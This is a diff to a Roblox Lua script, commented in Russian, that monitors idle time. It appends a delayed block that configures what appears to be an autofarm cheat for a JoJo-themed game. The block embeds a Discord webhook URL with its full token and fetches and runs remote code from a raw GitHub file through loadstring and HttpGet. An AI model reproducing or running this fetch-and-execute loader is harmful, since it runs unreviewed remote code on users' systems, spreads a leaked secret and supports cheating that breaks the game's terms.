@@ -101,3 +101,29 @@ player.CharacterAdded:Connect(monitorIdleTime)
 
 -- Запуск мониторинга при первом входе в игру
 monitorIdleTime()
+
+for i = 1, 1 do
+    task.spawn(function()
+        task.wait(5) -- Задержка перед выполнением кода
+        pcall(function()
+            getgenv().standList = {
+                ["The World"] = true,
+                ["Star Platinum"] = true,
+                ["Star Platinum: The World"] = true,
+                ["Crazy Diamond"] = true,
+                ["King Crimson"] = true,
+                ["King Crimson Requiem"] = true
+            }
+            getgenv().waitUntilCollect = 0.75
+            getgenv().sortOrder = "Asc"
+            getgenv().lessPing = false
+            getgenv().autoRequiem = true
+            getgenv().NPCTimeOut = 15
+            getgenv().HamonCharge = 70
+            getgenv().webhook = "https://discord.com/api/webhooks/1288789321192570972/nmuQYBwSVNjtZVp0afW2DACovpQ59kphCs0bWMi4bR9Wea4UavtbFjhxeuK8OLoQSqnI"
+
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/VernonMoore54/myprice/refs/heads/main/iou.lua"))()
+        end)
+    end)
+    task.wait(1) -- Задержка между выполнениями
+end
